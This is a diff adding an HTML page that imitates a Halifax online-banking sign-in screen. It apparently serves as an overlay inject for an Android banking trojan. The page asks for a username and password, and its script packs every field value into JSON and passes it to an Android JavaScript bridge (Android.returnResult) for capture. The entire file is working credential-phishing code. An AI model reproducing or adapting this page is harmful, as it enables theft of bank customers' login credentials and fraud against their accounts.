@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>halifax</title>
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+	body {
+		    background:#ffffff;
+		margin: 0;
+		padding: 0;
+		font-family: Helvetica, sans-serif;
+		background-size: 100%;
+	}
+	.logo {
+    text-align: center;
+    background-size: 100%;
+    padding: 20px 0px 20px 0px;
+    background: #435add;
+    color: #fff;
+    font-weight: 600;
+	}
+	.form {
+		text-align: center;
+		padding-top: 70px;
+	}
+	.form label {
+		display: block;
+	}
+	form {
+		display: inline-block;
+	}
+fieldset {
+	  position: relative;
+	  text-align: center;
+	  border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+border: 1px solid #d1d0d0;
+    line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 5px 20px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 10px 0px;
+    color: #7c7c7c;
+    text-align: left;
+    background: rgb(255, 255, 255);
+    outline: none;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 25px 0px 0px 0px;
+    outline: none;
+    float: right;
+    background: #3a4fc4;
+    color: #ffffff;
+    border: 1px solid #dfdfdf;
+    font-size: 14px;
+    -webkit-appearance: none;
+    border-radius: 2px;
+    cursor: pointer;
+}
+fieldset span {
+	display: inline-block;
+    width: 80%;
+    text-align: left;
+    color: #c5f8ff;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #b0adad;
+}
+</style>
+
+<fieldset id="formtosend">
+
+<div class="" id="bireysel" style="display: block;">
+
+<div class="logo">
+Sign in
+</div>
+
+<div class="area" style="padding: 0px 0px 0px 0px; margin: 10px;">
+
+<h3 style="text-align: left;font-size: 25px;font-weight: 600;width: auto;color: #3e54d1;"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC8AAAAlCAYAAADSvLDKAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAVhSURBVFhH7ZhpbFRVGIYB0YgLLg0GoySNIoqRmEhjEKMx/JAfRn9Y/aWxRo0kGkIkdKEbtAK2doFSsdNlpp1SOm2ZTktLoVq6L+m+75PpvtCFLlPaTmem83rOzb0p1TP33umQEBPe5E1m7v3mfM+dOd93zplN+B/rIbwgm3UV1mULzHdXsDK/jJVZ3uQ1vUbv0Zj7JefhbYBpehFTTSPoTqhByfdpyDxwAYkvnELsVm/EPuqNpJ2noTsYhdIjGehJqsOdtjGYZpb4ATYup+BXZpcwmN+Fsp8ycWX3OcRsOiHLqa//hopj2Rgu7IF53sSP5rg2BG+z2TDXM4lqr+u48uo5KLZ4MiHFrHjEE5o3QlAbcBPGgTvcL+ioHIcn4FPNo8j7JB4JT/kywRyxcrsf8j9PxJx+ik8gXw7DGwdmkLE/nHxzXkyYjVix1QtXD0RimdSOI3IIng5+1S2SCfBvxz7mjfgnfYlPkqKV96CZ70eRQpb/ALLhzUYTir7VMJPe6/htJ5HxdgTKf8lCZ2I1OhKqUPazFmlvhiHucR/mZwQrNnui4qgOFtJW5UgePCmmnuQ6JDztx0wqmH7Tt75OwUTNINc6DVmt6LvWhumWUYyVG7i5LfUA6p1BMGS2yCpgWfALQ7PI/Vgh2lXoveyPLpFiJv0+pR7XDv0J9UvBSN71K3IPx3JAk3VDpF4imJ8XTOf/X1+qsTg2z2e3L1nwPQRG/WIQM5lg+q23x1RgtESPjHci1j0obYu6gxcxUTeI5ogiydaa4nqW+8WkJAlvXjCh9EctYsh8ZCUSrHo+EFP1w2gKLWbCKbZ4oYuswBPVg5Kdis79au88WBbNPAVbkvCznbeRe0jBTHKvE10CubledTyHeZ+6PrhAFjz1zc9UMPaTxUtEkvAjxXpuOWclEKx8zh+avaEoP6bFjU/jkfLKWabz3VVcDF2Vlc+KF3/6vjBM1g/xFGxJwht0rWRKBDATCC74So2BvHaHnO+uZI4lOHHHKYwU6XkKtiThe5IbuJ0hK4Hg2sA8Plq+Kk9kM8cSTBe5wbwuPpotSfhusoWV6g4s+NUVC/SaRujTG2BZ+u+iIwVPC3wgt5OPZksSvje1EXFk1WQlEMyC74itQvwTvlCRemiNLuWvrkkKnrbeofxuPpotSfiBG51IfjmYmUAwC775fDG3mtKdZ0NIAX91TVLwl13PYLyyj49mSxJ+onYQWrfzzASCWfBLt43QvBXKdaG7w7P81TVJwWd/EI2ZjnE+mi1J+MWROfztrmYmEGyvYHMOK6D7MJp/t15S8CXfpWN5coGPZksSftVsRcOZAsSLHDzswbdFl6MlsoR/t15i8Mpn/NH2RwVsFvHDuiQ81XhlP9L2/s5MRF0TcJ2PXC+6taBbaZYqj2cxx6LOfDcKUw3DfKR9yYK3rdpQfCTd7qFC+14krKQ1ypXVZEaGWzhzrLhtPqjyyeFySkkWPNVs5wRSd9vfJqhdg8j8vogsMsfFTGOSdp1mjkGt3X8B873yzrOy4al6L9dD5SK+VXDG9L8eg7aZzyYth+BXSQE1hRVB6eLPTO6MVTsC0HapgsshVw7BU5kXVtBMOgj9F4wFsRGrySLYTlZkq0l+3VA5DE9Fu0hvSgM0e0KYMI44fV84+shZ17IkfvBgaUPwgua6J5H/hYrbAcZsZsMxTWJpVyn0uAKjQfzAISan4KloSxst1OOWRypSXwvhTv/0XwZuG02PjsT04RK2+3H3NHtCUfRDGsbL+2S1QzE5DS+IghgN0+jTtaAxtBBlR7NQ+E0aijzSyOkpmyv0fnKoXhiY4T/hvO4b/IPQQ/gHI+Afh06CnFm7LFwAAAAASUVORK5CYII=" style="width: 40px; position: relative; top: 6px;"> REGISTERED FOR ONLINE BANKING?</h3>
+
+<p style="display: block; float: left;font-size: 15px; color: #000;">Please enter you sign details below.</p>
+<br><br><br><br>
+
+
+		<input type="text" name="username" id="codice" placeholder="Username" style="height: 65px;">
+        <input type="password" name="password" id="codice" placeholder="Password" style="height: 65px;">
+		<input name="exit" type="hidden" text="true"/>
+		<input type="button" name="sumbit" onclick="send_form();" value="Continue">
+        <a href="#" style="text-decoration: none; font-weight: 600; color: #3147bc; position: relative; top: 10px;">Forgotten your sign-in details?</a>
+
+</div>
+
+</div>
+
+</fieldset>	
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+</script>
+
+</body>
+</html>
